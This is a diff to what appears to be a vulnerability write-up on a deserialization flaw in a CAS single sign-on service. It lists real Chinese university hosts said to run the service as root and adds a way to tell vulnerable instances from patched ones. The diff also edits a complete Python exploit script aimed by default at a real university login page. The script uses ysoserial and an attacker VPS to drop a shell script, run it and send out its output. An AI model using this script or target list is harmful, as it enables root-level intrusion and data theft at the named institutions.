@@ -82,7 +82,7 @@ The following instances were verified under authorized penetration testing engag
 | 14 | sso.sdwu.edu.cn | Shandong Women's University | No | 1.8.x |
 | 15 | facedatabase.sdu.edu.cn | Shandong University | No | 1.8.x |
 
-> All 40+ confirmed instances ran `rg-sso-cas-0.0.1-SNAPSHOT.jar` as root. FOFA surface scan identified 275 total exposed assets as of 2026-06-05.
+> All instances above were confirmed on 2026-06-05 running `rg-sso-cas-0.0.1-SNAPSHOT.jar` as root. Some may have been patched since disclosure. FOFA surface scan identified 275 total exposed assets as of that date. To check current status, send a GET request and inspect whether the `execution` value contains `_H4sI` (vulnerable) or `_ZXlK`/`_eyJ` (patched/JWT).
 
 ---
 
@@ -121,6 +121,11 @@ socketserver.TCPServer(('0.0.0.0', 8079), H).serve_forever()
 
 ### Complete Exploit Script
 
+**Requirements:**
+- Python 3
+- Java 8 JDK (not Java 9+; TemplatesImpl is blocked by JPMS in newer versions)
+- ysoserial-all.jar ([download](https://github.com/frohoff/ysoserial/releases))
+
 Save as `exploit.py` and run: `python3 exploit.py`
 
 ```python
@@ -136,8 +141,13 @@ import urllib.request, urllib.parse, urllib.error
 # ── Configuration ────────────────────────────────────────────
 TARGET = 'https://sfgl.njtech.edu.cn/cas/login'   # replace with target
 VPS    = '1.2.3.4'                                # replace with your VPS IP
-JAVA8  = 'java'                                   # path to Java 8 binary
-JAR    = 'ysoserial-all.jar'                      # path to ysoserial jar
+
+# IMPORTANT: Must be Java 8. Java 9+ blocks TemplatesImpl via JPMS.
+# macOS example: '/Library/Java/JavaVirtualMachines/temurin-8.jdk/Contents/Home/bin/java'
+# Linux example: '/usr/lib/jvm/java-8-openjdk-amd64/bin/java'
+JAVA8  = '/path/to/jdk8/bin/java'
+
+JAR    = '/path/to/ysoserial-all.jar'
 REPEAT = 2   # send each stage N times to cover load-balanced nodes
 # ─────────────────────────────────────────────────────────────
 
@@ -211,8 +221,8 @@ def main():
         print(f'    Sent {i+1}/{REPEAT}')
         time.sleep(0.5)
 
-    print(f'[*] Check VPS port 9090 for download — then press Enter')
-    input()
+    print(f'[*] Waiting 5s for download to complete on all nodes...')
+    time.sleep(5)
 
     # Step 3: Stage 2 — execute s.sh, exfiltrate output
     cmd2 = '/bin/bash /tmp/s.sh'
